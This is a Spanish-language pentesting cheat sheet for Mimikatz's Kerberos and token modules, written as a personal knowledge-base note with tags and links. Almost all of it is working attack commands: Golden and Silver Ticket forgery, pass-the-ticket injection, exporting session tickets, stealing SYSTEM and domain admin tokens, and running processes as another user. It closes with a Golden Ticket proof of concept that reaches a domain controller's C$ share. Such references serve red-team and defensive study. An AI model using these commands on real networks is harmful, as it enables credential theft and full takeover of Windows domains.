---
aliases:
  - Mimikatz kerberos
  - Mimikatz token
tags:
  - technique/credential-access
  - technique/privilege-escalation
  - env/windows
  - tool/mimikatz
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[Pass-the-Ticket]]"
---
# Mimikatz - kerberos y token

> Forja de tickets (Golden/Silver), Pass-the-Ticket y manipulación de tokens.

---

## Kerberos (forge / PtT)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /ptt` | Golden Ticket (TGT forjado) | Con hash de krbtgt → [[Golden Ticket]]. |
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /target:host.corp.local /service:cifs /rc4:COMPUTER_HASH /id:500 /ptt` | Silver Ticket (TGS de un servicio) | Con hash de service account → [[Silver Ticket]]. |
| `kerberos::ptt ticket.kirbi` | Inyecta un ticket robado en la sesión | [[Pass-the-Ticket]]. |
| `kerberos::list /export` | Lista + exporta tickets de la sesión actual | Robar tickets vivos. |
| `kerberos::purge` | Limpia tickets de la sesión | OPSEC / reset. |
^mimi-kerberos

## Token (impersonación)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `token::list` | Tokens disponibles en el host | Recon de identidades. |
| `token::elevate` | Eleva a SYSTEM (roba primary token) | Privesc local. |
| `token::elevate /domainadmin` | Roba un token de DA si está presente | Si un DA tiene sesión en el host. |
| `token::run /user:CORP\admin /process:cmd.exe` | Ejecuta como otro usuario vía su token | Impersonación. |
| `token::revert` | Vuelve al token original | Cleanup. |
^mimi-token

### PoC Golden Ticket

```
privilege::debug
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500 /groups:512 /ptt
:: TGT inyectado → dir \\dc01\c$
```
